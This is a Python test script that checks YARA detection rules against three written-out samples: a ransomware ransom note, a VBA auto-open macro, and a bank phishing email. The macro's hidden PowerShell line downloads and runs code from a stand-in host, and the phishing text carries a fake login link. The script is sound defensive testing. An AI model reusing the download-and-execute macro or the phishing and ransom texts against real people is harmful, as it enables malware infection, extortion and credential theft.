import yara
import os

yar_path = r'd:\Projects\Threat Gaurd Professional\backend\document_rules.yar'
compiled_rules = yara.compile(filepath=yar_path)

content_1 = """
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!
=========================================

All your important documents, photos, and databases have been
encrypted with military-grade AES-256 encryption.

To recover your files, you must:

1. Purchase Bitcoin worth $800 USD
2. Send payment to the following wallet address:
   1A2B3C4D5E6F7G8H9I0J

3. After payment, email us your unique ID:
   ID-7X9K2M-DECRYPT

DEADLINE: You have 72 hours to pay. After the deadline,
your unique private key will be permanently deleted and
your files will be UNRECOVERABLE.

DO NOT:
- Contact the police
- Try to decrypt files yourself
- Shut down your computer

Files affected: 14,823 files encrypted
Extensions renamed to: .locked
"""

content_2 = """
VBA MACRO SOURCE (extracted from suspicious .docx)
==================================================

Attribute VB_Name = "ThisDocument"

Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://evil.xyz/payload')"
End Sub

Sub Document_Open()
    Call AutoOpen
End Sub

Function GetObject(path As String) As Object
    ' hidden persistence mechanism
    Set GetObject = CreateObject("Shell.Application")
End Function

' End of macro
"""

content_3 = """
IMPORTANT NOTICE FROM YOUR BANK
===============================

Dear Valued Customer,

We have detected unusual activity on your account and it has been
temporarily suspended account for your protection.

To restore access, you must confirm your identity immediately by
clicking the link below.

>> click here immediately to restore access <<
   http://secure-bank-verify.xyz/login?token=abc123

Urgent action required within 24 hours or your account will be
permanently closed.

Please verify your account details at your earliest convenience.

Regards,
Security Team
First National Bank
"""

test_files = [
    ("test_ransomware.txt", content_1),
    ("test_macro.txt", content_2),
    ("test_phishing.txt", content_3)
]

for filename, content in test_files:
    file_path = os.path.join(r'd:\Projects\Threat Gaurd Professional\backend', filename)
    with open(file_path, "w") as f:
        f.write(content)
    
    matches = compiled_rules.match(file_path)
    print(f"Results for {filename}:")
    if matches:
        for match in matches:
            print(f"  - Triggered rule: {match.rule}")
    else:
        print("  - No threats detected.")
    print("-" * 30)
    
    os.remove(file_path)
